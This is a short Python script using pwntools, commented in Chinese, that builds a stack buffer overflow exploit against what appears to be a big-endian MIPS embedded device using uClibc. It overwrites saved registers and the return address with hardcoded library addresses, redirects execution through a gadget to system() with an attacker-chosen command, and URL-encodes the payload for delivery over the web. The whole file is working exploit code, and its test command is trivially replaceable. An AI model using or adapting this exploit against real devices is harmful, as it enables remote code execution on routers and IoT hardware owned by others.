from pwn import *
import urllib.parse

# 地址配置
libuclibc_base = 0x7790e000
libpthread_base = 0x77981000

system_addr = libuclibc_base + 0x50150
call_gadget_addr = libpthread_base + 0x53bc

buffer_start_addr = 0x7d1ff92b

# 命令
cmd = b"echo test > /tmp/test\x00"

# 构建payload
payload = b'A' * 605  # 填充到s0

# s0需要指向一个结构体，该结构体：
# offset 92: system地址
# offset 96: 命令字符串地址
struct_offset = 629  # 结构体在payload中的位置
cmd_offset = struct_offset + 100  # 命令放在结构体后面

# 寄存器覆盖
payload += p32(buffer_start_addr + struct_offset, endian='big')  # s0指向结构体
payload += b'B' * 4   # s1
payload += b'C' * 4   # s2
payload += b'D' * 4   # s3
payload += b'E' * 4   # s4

# 返回地址
payload += p32(call_gadget_addr, endian='big')  # ra

# 构造结构体
payload += b'X' * 92  # 填充到offset 92
payload += p32(system_addr, endian='big')  # offset 92: system地址
payload += p32(buffer_start_addr + cmd_offset, endian='big')  # offset 96: 命令地址

# 命令字符串
payload += cmd

print(f"[*] Payload长度: {len(payload)} bytes\n")

encoded_payload = urllib.parse.quote(payload)
print(encoded_payload)
